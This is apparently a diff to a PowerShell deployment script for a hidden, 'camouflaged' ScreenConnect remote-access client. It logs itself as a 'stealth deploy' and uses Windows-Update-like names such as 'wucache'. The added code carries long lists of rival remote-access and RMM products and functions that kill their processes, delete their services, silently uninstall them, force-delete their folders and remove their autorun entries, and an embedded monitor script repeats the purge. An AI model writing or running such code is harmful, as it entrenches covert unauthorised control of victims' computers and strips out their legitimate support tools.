@@ -83,10 +83,35 @@ $LegacyFingerprints = @(
 
 $RivalNames = @(
     'AnyDesk', 'TeamViewer', 'DWService', 'GoToMyPC', 'LogMeIn', 'VNC', 'UltraVNC', 'TightVNC',
-    'Splashtop', 'Zoho Assist', 'RustDesk', 'RemotePC', 'Dameware', 'Atera', 'NinjaOne',
-    'N-able', 'N-central', 'Kaseya', 'Pulseway', 'Syncro', 'SuperOps', 'ITarian',
-    'ManageEngine', 'SolarWinds', 'ConnectWise RMM', 'AnyDeskSetup', 'TeamViewer_Setup',
-    'TeamViewerQS', 'ScreenConnect.ClientSetup', 'ClientSetup'
+    'Splashtop', 'Zoho Assist', 'ZohoAssist', 'RustDesk', 'RemotePC', 'Dameware', 'DameWare',
+    'Atera', 'NinjaOne', 'NinjaRMM', 'N-able', 'N-central', 'Kaseya', 'Pulseway', 'Syncro',
+    'SuperOps', 'ITarian', 'ManageEngine', 'SolarWinds', 'ConnectWise RMM', 'ConnectWise Automate',
+    'ConnectWise Control', 'Continuum', 'Level.io', 'Level RMM', 'Action1', 'Datto RMM',
+    'Autotask', 'SimpleHelp', 'ISL Online', 'Chrome Remote Desktop', 'NoMachine', 'Ammyy',
+    'Supremo', 'Remote Utilities', 'Netop', 'Bomgar', 'BeyondTrust', 'MeshAgent', 'Mesh Central',
+    'TacticalRMM', 'TRMM', 'RMMagent', 'AgentSetup', 'AnyDeskSetup', 'TeamViewer_Setup',
+    'TeamViewerQS', 'ScreenConnect.ClientSetup', 'ClientSetup', 'GetScreen', 'ShowMyPC'
+)
+
+# Extra process/service tokens for non-SC RMM kill (matched against name/path/displayname)
+$RivalTokens = @(
+    'AnyDesk', 'TeamViewer', 'tv_', 'DWAgent', 'DWService', 'LogMeIn', 'LMIGuardian',
+    'WinVNC', 'vncserver', 'tvnserver', 'Splashtop', 'Zoho', 'RustDesk', 'RemotePC',
+    'DameWare', 'AteraAgent', 'NinjaRMM', 'NinjaOne', 'AdvancedMonitoringAgent',
+    'Kaseya', 'AgentMon', 'Pulseway', 'Syncro', 'SuperOps', 'ManageEngine', 'DCAgent',
+    'SolarWinds', 'SPLauncher', 'ConnectWiseAutomate', 'LTService',
+    'Continuum', 'LevelAgent', 'Action1', 'SimpleHelp', 'Bomgar',
+    'BeyondTrust', 'MeshAgent', 'TacticalRMM', 'tacticalrmm', 'GetScreen', 'Supremo',
+    'RemoteUtilities', 'rutserv', 'chromeremotedesktop', 'remoting_host'
+)
+
+$RivalFolderHints = @(
+    'AnyDesk', 'TeamViewer', 'DWAgent', 'DWService', 'LogMeIn', 'UltraVNC', 'TightVNC',
+    'Splashtop', 'Zoho Meeting', 'Zoho Assist', 'RustDesk', 'RemotePC', 'DameWare',
+    'Atera', 'NinjaRMM', 'NinjaOne', 'N-able', 'Kaseya', 'Pulseway', 'Syncro',
+    'SuperOps', 'ManageEngine', 'SolarWinds', 'ConnectWise Automate', 'Level.io',
+    'Level Agent', 'Action1', 'SimpleHelp', 'Bomgar', 'BeyondTrust', 'Mesh Agent',
+    'TacticalRMM', 'ScreenConnect Client'
 )
 
 # ============================================
@@ -622,16 +647,96 @@ function Write-FailoverVbs {
 }
 
 function Test-IsAllowedSc {
-    param([string]$Name, [string]$Path = '')
+    param([string]$Name = '', [string]$Path = '')
+    $blob = "$Name $Path"
     foreach ($fp in $AllowedFingerprints) {
-        if ($Name -like "*$fp*" -or $Path -like "*$fp*") { return $true }
+        if ($blob -like "*$fp*") { return $true }
     }
-    # Camouflaged primary only - never treat generic ScreenConnect as allowed
-    if ($Name -eq $ArpDisplayName -and ($Path -like "*$PrimaryFingerprint*" -or $Name -eq $ArpDisplayName)) {
-        # ARP name alone is weak; still allow service-path checks via fingerprint elsewhere
-        return $true
+    # Camouflaged primary ARP name ONLY if path proves primary fingerprint
+    if ($Name -eq $ArpDisplayName -and $Path -like "*$PrimaryFingerprint*") { return $true }
+    return $false
+}
+
+function Test-IsAllowedBlob {
+    param([string]$Blob)
+    foreach ($fp in $AllowedFingerprints) {
+        if ($Blob -like "*$fp*") { return $true }
     }
     return $false
+}
+
+function Stop-DeleteServiceSafe {
+    param([string]$ServiceName)
+    if ([string]::IsNullOrWhiteSpace($ServiceName)) { return }
+    & sc.exe stop "$ServiceName" >$null 2>&1
+    Start-Sleep -Milliseconds 400
+    & sc.exe config "$ServiceName" start= disabled >$null 2>&1
+    & sc.exe delete "$ServiceName" >$null 2>&1
+    try {
+        $esc = $ServiceName.Replace("'", "''")
+        $s = Get-CimInstance Win32_Service -Filter "Name='$esc'" -ErrorAction SilentlyContinue
+        if ($s) {
+            Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
+            $s.Delete() | Out-Null
+        }
+    } catch {}
+}
+
+function Invoke-QuietUninstall {
+    param([string]$UninstallString, [string]$QuietUninstallString = '')
+    $cmd = $QuietUninstallString
+    if ([string]::IsNullOrWhiteSpace($cmd)) { $cmd = $UninstallString }
+    if ([string]::IsNullOrWhiteSpace($cmd)) { return }
+
+    if ($cmd -match '\{([0-9A-Fa-f-]{8,}(?:-[0-9A-Fa-f-]{4}){3}-[0-9A-Fa-f-]{12})\}' -or
+        $cmd -match '\{([0-9A-Fa-f-]+)\}') {
+        $guid = '{' + $Matches[1] + '}'
+        Write-Log "Quiet uninstall msiexec /x $guid"
+        $p = Start-Process msiexec.exe -ArgumentList "/x $guid /quiet /norestart /qn" `
+            -Wait -PassThru -WindowStyle Hidden
+        Write-Log "uninstall exit $($p.ExitCode)"
+        return
+    }
+
+    $exe = $null
+    $args = ''
+    if ($cmd -match '^\s*"([^"]+)"\s*(.*)$') {
+        $exe = $Matches[1]; $args = $Matches[2]
+    } elseif ($cmd -match '^\s*(\S+)\s*(.*)$') {
+        $exe = $Matches[1]; $args = $Matches[2]
+    }
+    if (-not $exe -or -not (Test-Path $exe)) { return }
+    if ($args -notmatch '(?i)(/S|/silent|/quiet|/qn|uninstall|/VERYSILENT)') {
+        if ($exe -like '*.exe') { $args = ($args + ' /S /silent /quiet').Trim() }
+    }
+    Write-Log "Quiet uninstall exe: $exe $args"
+    try {
+        $p = Start-Process -FilePath $exe -ArgumentList $args -Wait -PassThru -WindowStyle Hidden
+        Write-Log "uninstall exe exit $($p.ExitCode)"
+    } catch {
+        Write-Log "uninstall exe failed: $($_.Exception.Message)"
+    }
+}
+
+function Remove-TreeForce {
+    param([string]$Path)
+    if (-not $Path -or -not (Test-Path -LiteralPath $Path)) { return }
+    try {
+        Get-ChildItem -LiteralPath $Path -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
+            try { $_.Attributes = 'Normal' } catch {}
+        }
+        $item = Get-Item -LiteralPath $Path -Force -ErrorAction SilentlyContinue
+        if ($item) { try { $item.Attributes = 'Normal' } catch {} }
+    } catch {}
+    Remove-Item -LiteralPath $Path -Recurse -Force -ErrorAction SilentlyContinue
+    if (Test-Path -LiteralPath $Path) {
+        cmd.exe /c "rmdir /s /q `"$Path`"" >$null 2>&1
+    }
+    if (-not (Test-Path -LiteralPath $Path)) {
+        Write-Log "Removed tree: $Path"
+    } else {
+        Write-Log "FAILED remove tree: $Path"
+    }
 }
 
 function Get-InstalledScFingerprints {
@@ -639,46 +744,57 @@ function Get-InstalledScFingerprints {
 
     try {
         Get-CimInstance -ClassName Win32_Service -ErrorAction SilentlyContinue |
-            Where-Object { $_.Name -like 'ScreenConnect Client*' -or $_.DisplayName -like 'ScreenConnect Client*' } |
+            Where-Object {
+                $_.Name -like '*ScreenConnect*' -or $_.DisplayName -like '*ScreenConnect*' -or
+                $_.Name -like '*ConnectWise Control*' -or $_.DisplayName -like '*ConnectWise Control*' -or
+                ($_.PathName -and ($_.PathName -like '*ScreenConnect*' -or $_.PathName -like '*ConnectWise*Control*'))
+            } |
             ForEach-Object {
                 $blob = "$($_.Name) $($_.DisplayName) $($_.PathName)"
-                if ($blob -match '\(([0-9a-fA-F]{16})\)') { [void]$found.Add($Matches[1].ToLower()) }
-                elseif ($blob -match '([0-9a-fA-F]{16})') { [void]$found.Add($Matches[1].ToLower()) }
+                [regex]::Matches($blob, '(?i)(?:\(|\b)([0-9a-f]{16})(?:\)|\b)') | ForEach-Object {
+                    [void]$found.Add($_.Groups[1].Value.ToLower())
+                }
             }
     } catch {}
 
-    foreach ($base in @(
-        "${env:ProgramFiles}",
-        "${env:ProgramFiles(x86)}"
-    )) {
+    foreach ($base in @("${env:ProgramFiles}", "${env:ProgramFiles(x86)}")) {
         if (-not (Test-Path $base)) { continue }
         Get-ChildItem -Path $base -Directory -ErrorAction SilentlyContinue |
-            Where-Object { $_.Name -like 'ScreenConnect Client*' } |
+            Where-Object { $_.Name -like 'ScreenConnect*' -or $_.Name -like 'ConnectWise Control*' } |
             ForEach-Object {
-                if ($_.Name -match '\(([0-9a-fA-F]{16})\)') { [void]$found.Add($Matches[1].ToLower()) }
+                [regex]::Matches($_.Name, '(?i)([0-9a-f]{16})') | ForEach-Object {
+                    [void]$found.Add($_.Groups[1].Value.ToLower())
+                }
             }
     }
 
-    $pd = "${env:ProgramData}\ScreenConnect"
-    if (Test-Path $pd) {
+    foreach ($pd in @(
+        "${env:ProgramData}\ScreenConnect",
+        "${env:ProgramData}\ConnectWiseControl",
+        "${env:ProgramData}\ConnectWise"
+    )) {
+        if (-not (Test-Path $pd)) { continue }
         Get-ChildItem -Path $pd -Directory -ErrorAction SilentlyContinue | ForEach-Object {
-            if ($_.Name -match '^([0-9a-fA-F]{16})$') { [void]$found.Add($Matches[1].ToLower()) }
-            elseif ($_.Name -match '([0-9a-fA-F]{16})') { [void]$found.Add($Matches[1].ToLower()) }
+            [regex]::Matches($_.Name, '(?i)([0-9a-f]{16})') | ForEach-Object {
+                [void]$found.Add($_.Groups[1].Value.ToLower())
+            }
         }
     }
 
     foreach ($key in @(
         'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
-        'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
+        'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall',
+        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'
     )) {
         if (-not (Test-Path $key)) { continue }
         Get-ChildItem $key -ErrorAction SilentlyContinue | ForEach-Object {
             $app = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
             if (-not $app) { return }
-            $blob = "$($app.DisplayName) $($app.InstallLocation) $($_.PSChildName)"
-            if ($blob -notlike '*ScreenConnect*') { return }
-            if ($blob -match '\(([0-9a-fA-F]{16})\)') { [void]$found.Add($Matches[1].ToLower()) }
-            elseif ($blob -match '([0-9a-fA-F]{16})') { [void]$found.Add($Matches[1].ToLower()) }
+            $blob = "$($app.DisplayName) $($app.InstallLocation) $($app.Publisher) $($_.PSChildName) $($app.UninstallString)"
+            if ($blob -notmatch '(?i)ScreenConnect|ConnectWise\s*Control') { return }
+            [regex]::Matches($blob, '(?i)([0-9a-f]{16})') | ForEach-Object {
+                [void]$found.Add($_.Groups[1].Value.ToLower())
+            }
         }
     }
 
@@ -688,6 +804,7 @@ function Get-InstalledScFingerprints {
 function Remove-ScByFingerprint {
     param([string]$Fingerprint)
     if ([string]::IsNullOrWhiteSpace($Fingerprint)) { return }
+    $Fingerprint = $Fingerprint.ToLower()
     if ($Fingerprint -in $AllowedFingerprints) {
         Write-Log "Skip remove - allowed fingerprint: $Fingerprint"
         return
@@ -695,80 +812,62 @@ function Remove-ScByFingerprint {
 
     Write-Log "Removing unauthorized ScreenConnect: $Fingerprint"
     $targetSvc = "ScreenConnect Client ($Fingerprint)"
+    Stop-DeleteServiceSafe -ServiceName $targetSvc
 
-    # Prefer sc.exe / CIM - Get-Service breaks on parentheses
-    & sc.exe stop "$targetSvc" >$null 2>&1
-    & sc.exe delete "$targetSvc" >$null 2>&1
     try {
         Get-CimInstance -ClassName Win32_Service -ErrorAction SilentlyContinue |
-            Where-Object { $_.Name -like "*$Fingerprint*" -or $_.DisplayName -like "*$Fingerprint*" } |
+            Where-Object {
+                "$($_.Name) $($_.DisplayName) $($_.PathName)" -like "*$Fingerprint*"
+            } |
             ForEach-Object {
-                & sc.exe stop "$($_.Name)" >$null 2>&1
-                & sc.exe delete "$($_.Name)" >$null 2>&1
+                Stop-DeleteServiceSafe -ServiceName $_.Name
                 Write-Log "Deleted SC service: $($_.Name)"
             }
     } catch {}
 
-    Get-Process -ErrorAction SilentlyContinue | Where-Object {
-        $path = ''
-        try { $path = $_.Path } catch {}
-        ($path -and $path -like "*$Fingerprint*") -or ($_.ProcessName -like '*ScreenConnect*')
+    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
+        $_.Name -match '(?i)ScreenConnect|ClientService|ConnectWise' -or
+        ($_.CommandLine -and $_.CommandLine -like "*$Fingerprint*")
     } | ForEach-Object {
-        $path = ''
-        try { $path = $_.Path } catch {}
-        $keep = $false
-        foreach ($fp in $AllowedFingerprints) { if ($path -like "*$fp*") { $keep = $true; break } }
-        if (-not $keep) {
-            Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
-        }
+        $cl = "$($_.CommandLine)"
+        if (Test-IsAllowedBlob -Blob $cl) { return }
+        try { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue } catch {}
+        Write-Log "Killed SC process PID $($_.ProcessId) $($_.Name)"
     }
 
     foreach ($key in @(
         'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
-        'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
+        'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall',
+        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'
     )) {
         if (-not (Test-Path $key)) { continue }
         Get-ChildItem $key -ErrorAction SilentlyContinue | ForEach-Object {
             $app = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
             if (-not $app) { return }
-            $hit = ($app.DisplayName -like "*$Fingerprint*") -or
-                   ($app.InstallLocation -like "*$Fingerprint*") -or
-                   ($_.PSPath -like "*$Fingerprint*") -or
-                   ($app.DisplayName -like 'ScreenConnect Client*' -and "$($app.DisplayName) $($app.InstallLocation)" -like "*$Fingerprint*")
-            if (-not $hit) { return }
-            if (Test-IsAllowedSc -Name $app.DisplayName -Path $app.InstallLocation) { return }
-
-            $guid = $null
-            if ($_.PSChildName -match '^\{[0-9A-Fa-f-]+\}$') { $guid = $_.PSChildName }
-            elseif ($app.UninstallString -match '\{([0-9A-Fa-f-]+)\}') { $guid = '{' + $Matches[1] + '}' }
-            if ($guid) {
-                Write-Log "msiexec /x $guid (rival $Fingerprint)"
-                $xp = Start-Process msiexec.exe -ArgumentList "/x $guid /quiet /norestart" `
-                    -Wait -PassThru -WindowStyle Hidden
-                Write-Log "rival uninstall exit $($xp.ExitCode)"
-            }
+            $blob = "$($app.DisplayName) $($app.InstallLocation) $($_.PSPath) $($app.UninstallString)"
+            if ($blob -notlike "*$Fingerprint*") { return }
+            if (Test-IsAllowedBlob -Blob $blob) { return }
+            Invoke-QuietUninstall -UninstallString "$($app.UninstallString)" `
+                -QuietUninstallString "$($app.QuietUninstallString)"
+            try { Remove-Item -LiteralPath $_.PSPath -Recurse -Force -ErrorAction SilentlyContinue } catch {}
         }
     }
 
     foreach ($p in @(
         "${env:ProgramFiles}\ScreenConnect Client ($Fingerprint)",
         "${env:ProgramFiles(x86)}\ScreenConnect Client ($Fingerprint)",
-        "${env:ProgramData}\ScreenConnect\$Fingerprint"
+        "${env:ProgramFiles}\ConnectWise Control Client ($Fingerprint)",
+        "${env:ProgramFiles(x86)}\ConnectWise Control Client ($Fingerprint)",
+        "${env:ProgramData}\ScreenConnect\$Fingerprint",
+        "${env:ProgramData}\ConnectWiseControl\$Fingerprint",
+        "${env:ProgramData}\ConnectWise\$Fingerprint"
     )) {
-        if (Test-Path $p) {
-            try {
-                Get-ChildItem $p -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
-                    try { $_.Attributes = 'Normal' } catch {}
-                }
-            } catch {}
-            Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue
-            Write-Log "Removed rival path: $p"
-        }
+        Remove-TreeForce -Path $p
     }
 }
 
 function Invoke-RemoveUnauthorizedScreenConnect {
-    Write-Log 'Purging unauthorized ScreenConnect clients'
+    Write-Log 'Purging unauthorized ScreenConnect / ConnectWise Control'
     $fps = @(Get-InstalledScFingerprints)
     Write-Log ("SC fingerprints found: " + ($(if ($fps.Count) { $fps -join ', ' } else { '(none)' })))
     foreach ($fp in $fps) {
@@ -779,40 +878,169 @@ function Invoke-RemoveUnauthorizedScreenConnect {
         Remove-ScByFingerprint -Fingerprint $fp
     }
 
-    # Catch services/folders that lack a clean 16-hex fingerprint in the name
     try {
         Get-CimInstance -ClassName Win32_Service -ErrorAction SilentlyContinue |
             Where-Object {
-                ($_.Name -like 'ScreenConnect*' -or $_.DisplayName -like 'ScreenConnect*') -and
-                -not (Test-IsAllowedSc -Name $_.Name -Path $_.PathName) -and
-                -not (Test-IsAllowedSc -Name $_.DisplayName -Path $_.PathName)
+                $blob = "$($_.Name) $($_.DisplayName) $($_.PathName)"
+                ($blob -match '(?i)ScreenConnect|ConnectWise\s*Control') -and
+                -not (Test-IsAllowedBlob -Blob $blob)
             } |
             ForEach-Object {
-                Write-Log "Force-delete non-allowed SC service: $($_.Name)"
-                & sc.exe stop "$($_.Name)" >$null 2>&1
-                & sc.exe delete "$($_.Name)" >$null 2>&1
+                Write-Log "Force-delete non-allowed SC service: $($_.Name) / $($_.DisplayName)"
+                Stop-DeleteServiceSafe -ServiceName $_.Name
+                if ("$($_.PathName)" -match '(?i)([0-9a-f]{16})') {
+                    Remove-ScByFingerprint -Fingerprint $Matches[1]
+                }
             }
     } catch {}
 
     foreach ($base in @("${env:ProgramFiles}", "${env:ProgramFiles(x86)}")) {
         if (-not (Test-Path $base)) { continue }
         Get-ChildItem -Path $base -Directory -ErrorAction SilentlyContinue |
-            Where-Object { $_.Name -like 'ScreenConnect Client*' } |
+            Where-Object { $_.Name -like 'ScreenConnect*' -or $_.Name -like 'ConnectWise Control*' } |
             ForEach-Object {
-                $keep = $false
-                foreach ($fp in $AllowedFingerprints) {
-                    if ($_.Name -like "*$fp*" -or $_.FullName -like "*$fp*") { $keep = $true; break }
-                }
-                if (-not $keep) {
-                    Write-Log "Removing non-allowed SC folder: $($_.FullName)"
-                    Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
-                }
+                if (Test-IsAllowedBlob -Blob $_.FullName) { return }
+                Write-Log "Removing non-allowed SC folder: $($_.FullName)"
+                Remove-TreeForce -Path $_.FullName
             }
+    }
+
+    $left = @(Get-InstalledScFingerprints | Where-Object { $_ -notin $AllowedFingerprints })
+    if ($left.Count -gt 0) {
+        Write-Log ("SC purge residual fingerprints: " + ($left -join ', '))
+        foreach ($fp in $left) { Remove-ScByFingerprint -Fingerprint $fp }
+    } else {
+        Write-Log 'SC purge clean - only allowed fingerprints remain (or none)'
+    }
+}
+
+function Invoke-RemoveUnauthorizedRmm {
+    Write-Log 'Purging unauthorized RMM / remote tools'
+
+    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | ForEach-Object {
+        $blob = "$($_.Name) $($_.CommandLine)"
+        if (Test-IsAllowedBlob -Blob $blob) { return }
+        if ($blob -like '*\.wucache*' -or $blob -like '*wucache_pkg*' -or $blob -like '*wucache.ps1*') { return }
+        $hit = $false
+        foreach ($t in $RivalTokens) {
+            if ($blob -like "*$t*") { $hit = $true; break }
+        }
+        if (-not $hit) { return }
+        try {
+            Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
+            Write-Log "Killed rival process: $($_.Name) PID $($_.ProcessId)"
+        } catch {}
+    }
+
+    try {
+        Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | ForEach-Object {
+            $blob = "$($_.Name) $($_.DisplayName) $($_.PathName)"
+            if (Test-IsAllowedBlob -Blob $blob) { return }
+            $hit = $false
+            foreach ($t in $RivalTokens) {
+                if ($blob -like "*$t*") { $hit = $true; break }
+            }
+            foreach ($n in $RivalNames) {
+                if ($_.DisplayName -like "*$n*" -or $_.Name -like "*$n*") { $hit = $true; break }
+            }
+            if (-not $hit) { return }
+            Write-Log "Removing rival service: $($_.Name) / $($_.DisplayName)"
+            Stop-DeleteServiceSafe -ServiceName $_.Name
+        }
+    } catch {}
+
+    foreach ($key in @(
+        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
+        'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall',
+        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall'
+    )) {
+        if (-not (Test-Path $key)) { continue }
+        Get-ChildItem $key -ErrorAction SilentlyContinue | ForEach-Object {
+            $app = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
+            if (-not $app -or -not $app.DisplayName) { return }
+            $n = [string]$app.DisplayName
+            $blob = "$n $($app.Publisher) $($app.InstallLocation) $($app.UninstallString)"
+            if (Test-IsAllowedBlob -Blob $blob) { return }
+            if ($n -like '*Datto*' -and $n -notlike '*Datto RMM*') { return }
+            if ($blob -match '(?i)ScreenConnect|ConnectWise\s*Control') { return }
+
+            $match = $false
+            foreach ($b in $RivalNames) { if ($n -like "*$b*" -or $blob -like "*$b*") { $match = $true; break } }
+            foreach ($t in $RivalTokens) { if ($blob -like "*$t*") { $match = $true; break } }
+            if (-not $match) { return }
+
+            Write-Log "Uninstalling rival app: $n"
+            Invoke-QuietUninstall -UninstallString "$($app.UninstallString)" `
+                -QuietUninstallString "$($app.QuietUninstallString)"
+        }
+    }
+
+    foreach ($base in @(
+        "${env:ProgramFiles}",
+        "${env:ProgramFiles(x86)}",
+        "$env:ProgramData",
+        "$env:LOCALAPPDATA",
+        "$env:APPDATA"
+    )) {
+        if (-not (Test-Path $base)) { continue }
+        Get-ChildItem -Path $base -Directory -ErrorAction SilentlyContinue | ForEach-Object {
+            $name = $_.Name
+            $full = $_.FullName
+            if (Test-IsAllowedBlob -Blob $full) { return }
+            $hit = $false
+            foreach ($h in $RivalFolderHints) {
+                if ($name -like "*$h*") { $hit = $true; break }
+            }
+            if (-not $hit) { return }
+            if ($full -like '*\.wucache*' -or $full -like '*\.etlcache*') { return }
+            Write-Log "Removing rival folder: $full"
+            Remove-TreeForce -Path $full
+        }
+    }
+
+    foreach ($runPath in @(
+        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
+        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run',
+        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
+    )) {
+        if (-not (Test-Path $runPath)) { continue }
+        $props = Get-ItemProperty -Path $runPath -ErrorAction SilentlyContinue
+        if (-not $props) { continue }
+        $props.PSObject.Properties | Where-Object {
+            $_.Name -notmatch '^PS' -and $_.Value -is [string]
+        } | ForEach-Object {
+            $blob = "$($_.Name) $($_.Value)"
+            if (Test-IsAllowedBlob -Blob $blob) { return }
+            $hit = $false
+            foreach ($t in $RivalTokens) { if ($blob -like "*$t*") { $hit = $true; break } }
+            foreach ($b in $RivalNames) { if ($blob -like "*$b*") { $hit = $true; break } }
+            if (-not $hit) { return }
+            Remove-ItemProperty -Path $runPath -Name $_.Name -Force -ErrorAction SilentlyContinue
+            Write-Log "Removed Run value: $runPath\$($_.Name)"
+        }
+    }
+
+    foreach ($folder in @(
+        [Environment]::GetFolderPath('CommonStartup'),
+        [Environment]::GetFolderPath('Startup')
+    )) {
+        if (-not $folder -or -not (Test-Path $folder)) { continue }
+        Get-ChildItem $folder -Force -ErrorAction SilentlyContinue | ForEach-Object {
+            $blob = "$($_.Name) $($_.FullName)"
+            if (Test-IsAllowedBlob -Blob $blob) { return }
+            $hit = $false
+            foreach ($t in $RivalTokens) { if ($blob -like "*$t*") { $hit = $true; break } }
+            foreach ($b in $RivalNames) { if ($blob -like "*$b*") { $hit = $true; break } }
+            if ($_.Name -like '*.ps1' -or $_.Name -like 'SC_*') { $hit = $true }
+            if (-not $hit) { return }
+            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
+            Write-Log "Removed Startup: $($_.FullName)"
+        }
     }
 }
 
 Write-Log '=== Stealth deploy start ==='
-Write-Log 'WU_BUILD_20260729T'
+Write-Log 'WU_BUILD_20260729U'
 
 # ============================================
 # PHASE 0: WIPE LOUD OLD VERSION + LEGACY
@@ -821,6 +1049,7 @@ Write-Log 'PHASE 0: removing old loud artifacts'
 
 foreach ($fp in $LegacyFingerprints) { Remove-ScByFingerprint -Fingerprint $fp }
 Invoke-RemoveUnauthorizedScreenConnect
+Invoke-RemoveUnauthorizedRmm
 
 # Old loud tasks from previous script versions
 $loudTaskHints = @(
@@ -1187,54 +1416,7 @@ function Start-PrimaryService {
 function Invoke-RivalPurge {
     Write-Log 'Rival purge'
     Invoke-RemoveUnauthorizedScreenConnect
-
-    Get-Process -ErrorAction SilentlyContinue | ForEach-Object {
-        $pn = $_.ProcessName
-        $path = ''
-        try { $path = $_.Path } catch {}
-
-        if ($pn -like '*ScreenConnect*' -or $pn -like '*ClientService*') {
-            $ok = $false
-            foreach ($fp in $AllowedFingerprints) {
-                if ($path -like "*$fp*" -or $pn -like "*$fp*") { $ok = $true; break }
-            }
-            # No path (AV) or non-allowed path -> kill
-            if (-not $ok) {
-                Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
-            }
-            return
-        }
-        foreach ($b in $RivalNames) {
-            if ($pn -like "*$b*" -or ($path -and $path -like "*$b*")) {
-                Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
-                break
-            }
-        }
-    }
-
-    # Quiet uninstall of other rival RMM brands (SC handled above)
-    foreach ($key in @(
-        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
-        'HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
-    )) {
-        if (-not (Test-Path $key)) { continue }
-        Get-ChildItem $key -ErrorAction SilentlyContinue | ForEach-Object {
-            $app = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
-            if (-not $app -or -not $app.DisplayName -or -not $app.UninstallString) { return }
-            $n = $app.DisplayName
-            if (Test-IsAllowedSc -Name $n -Path $app.InstallLocation) { return }
-            if ($n -like '*Datto*') { return }
-            if ($n -like '*ScreenConnect*') { return }  # handled by Invoke-RemoveUnauthorizedScreenConnect
-            $match = $false
-            foreach ($b in $RivalNames) { if ($n -like "*$b*") { $match = $true; break } }
-            if (-not $match) { return }
-            if ($app.UninstallString -match '\{([0-9A-Fa-f-]+)\}') {
-                Start-Process msiexec.exe -ArgumentList "/x {$($Matches[1])} /quiet /norestart" `
-                    -Wait -WindowStyle Hidden | Out-Null
-            }
-        }
-    }
-
+    Invoke-RemoveUnauthorizedRmm
     Start-PrimaryService | Out-Null
 }
 
@@ -1442,9 +1624,53 @@ function ReactiveIfBlocked {
     }
 }
 function Allowed([string]`$n,[string]`$p='') {
-    foreach (`$a in `$allowed) { if (`$n -like "*`$a*" -or `$p -like "*`$a*") { return `$true } }
-    if (`$n -eq `$arpName) { return `$true }
+    `$blob = "`$n `$p"
+    foreach (`$a in `$allowed) { if (`$blob -like "*`$a*") { return `$true } }
+    if (`$n -eq `$arpName -and `$p -like "*`$fp*") { return `$true }
     return `$false
+}
+function KillSvc([string]`$n) {
+    if ([string]::IsNullOrWhiteSpace(`$n)) { return }
+    cmd /c "sc stop `"`$n`"" >`$null 2>&1
+    cmd /c "sc config `"`$n`" start= disabled" >`$null 2>&1
+    cmd /c "sc delete `"`$n`"" >`$null 2>&1
+}
+function PurgeBadSc {
+    L 'monitor: purge unauthorized SC'
+    try {
+        Get-CimInstance Win32_Service -EA SilentlyContinue | Where-Object {
+            `$blob = "`$(`$_.Name) `$(`$_.DisplayName) `$(`$_.PathName)"
+            (`$blob -match '(?i)ScreenConnect|ConnectWise\s*Control') -and -not (Allowed `$_.Name `$_.PathName) -and -not (Allowed `$_.DisplayName `$_.PathName)
+        } | ForEach-Object {
+            L ("monitor: delete SC svc `$(`$_.Name)")
+            KillSvc `$_.Name
+            if ("`$(`$_.PathName)" -match '(?i)([0-9a-f]{16})') {
+                `$badFp = `$Matches[1].ToLower()
+                if (`$badFp -notin `$allowed) {
+                    foreach (`$dir in @(
+                        "`${env:ProgramFiles}\ScreenConnect Client (`$badFp)",
+                        "`${env:ProgramFiles(x86)}\ScreenConnect Client (`$badFp)",
+                        "`${env:ProgramData}\ScreenConnect\`$badFp"
+                    )) {
+                        if (Test-Path `$dir) { Remove-Item `$dir -Recurse -Force -EA SilentlyContinue; L "monitor: removed `$dir" }
+                    }
+                }
+            }
+        }
+    } catch {}
+    foreach (`$base in @("`${env:ProgramFiles}","`${env:ProgramFiles(x86)}")) {
+        if (-not (Test-Path `$base)) { continue }
+        Get-ChildItem `$base -Directory -EA SilentlyContinue |
+            Where-Object { `$_.Name -like 'ScreenConnect*' -or `$_.Name -like 'ConnectWise Control*' } |
+            ForEach-Object {
+                `$keep = `$false
+                foreach (`$a in `$allowed) { if (`$_.Name -like "*`$a*" -or `$_.FullName -like "*`$a*") { `$keep = `$true; break } }
+                if (-not `$keep) {
+                    L ("monitor: remove SC folder `$(`$_.FullName)")
+                    Remove-Item `$_.FullName -Recurse -Force -EA SilentlyContinue
+                }
+            }
+    }
 }
 function Arp {
     foreach (`$root in @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall','HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')) {
